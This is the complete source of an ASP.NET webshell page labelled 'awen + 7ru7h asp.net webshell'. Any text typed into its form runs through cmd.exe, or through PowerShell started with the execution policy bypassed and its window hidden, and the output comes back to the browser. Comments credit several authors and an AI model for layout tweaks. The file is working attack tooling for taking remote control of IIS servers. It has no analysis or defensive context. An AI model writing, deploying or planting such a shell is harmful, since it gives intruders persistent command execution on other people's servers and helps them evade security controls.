<%@ Page Language="C#" Debug="true" Trace="false" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.IO" %>
<script Language="c#" runat="server">
void Page_Load(object sender, EventArgs e)
{
}
string ExcuteCmd(string arg)
{
ProcessStartInfo psi = new ProcessStartInfo();
psi.FileName = "cmd.exe";
psi.Arguments = "/c "+arg;
psi.RedirectStandardOutput = true;
psi.UseShellExecute = false;
Process p = Process.Start(psi);
StreamReader stmrdr = p.StandardOutput;
string s = stmrdr.ReadToEnd();
stmrdr.Close();
return s;
}
void cmdExe_Click(object sender, System.EventArgs e)
{
Response.Write("<pre>");
Response.Write(Server.HtmlEncode(ExcuteCmd(txtArg.Text)));
Response.Write("</pre>");
}
string ExcutePWSH(string arg)
{
ProcessStartInfo psi = new ProcessStartInfo();
psi.FileName = "powershell.exe";
psi.Arguments = "-ep bypass -windowstyle hidden -command {"+arg+" }";
psi.RedirectStandardOutput = true;
psi.UseShellExecute = false;
Process p = Process.Start(psi);
StreamReader stmrdr = p.StandardOutput;
string s = stmrdr.ReadToEnd();
stmrdr.Close();
return s;
}
void pwshExe_Click(object sender, System.EventArgs e)
{
Response.Write("<pre>");
Response.Write(Server.HtmlEncode(ExcutePWSH(txtArg.Text)));
Response.Write("</pre>");
}
</script>
<HTML>
<HEAD>
<title>awen + 7ru7h asp.net webshell</title>
</HEAD>
<body>
<form id="cmd" method="post" runat="server">
<asp:TextBox id="txtArg" style="Z-INDEX: 101; LEFT: 405px; POSITION: absolute; TOP: 20px" runat="server" Width="250px"></asp:TextBox>
<asp:Button id="cmd" style="Z-INDEX: 102; LEFT: 675px; POSITION: absolute; TOP: 18px" runat="server" Text="cmd.exe" OnClick="cmdExe_Click"></asp:Button>
<asp:Label id="lblText" style="Z-INDEX: 103; LEFT: 310px; POSITION: absolute; TOP: 22px" runat="server">Execute cmd /c without ShellExec - good for commands:</asp:Label>
</form>
<form id="powershell" method="post" runat="server">
<asp:TextBox id="txtArg" style="Z-INDEX: 104; LEFT: 405px; POSITION: absolute; TOP: 40px" runat="server" Width="250px"></asp:TextBox>
<asp:Button id="pwsh" style="Z-INDEX: 105; LEFT: 675px; POSITION: absolute; TOP: 36px" runat="server" Text="powershell.exe" OnClick="pwshExe_Click"></asp:Button>
<asp:Label id="lblText" style="Z-INDEX: 106; LEFT: 310px; POSITION: absolute; TOP: 44px" runat="server">Execute PowerShell:</asp:Label>
</form>
</body>
</HTML>

<!-- "Improvements" by 7ru7h and Phind model for button position guessing--->
<!-- Contributed by Dominic Chell (http://digitalapocalypse.blogspot.com/) -->
<!--    http://michaeldaw.org   04/2007    -->
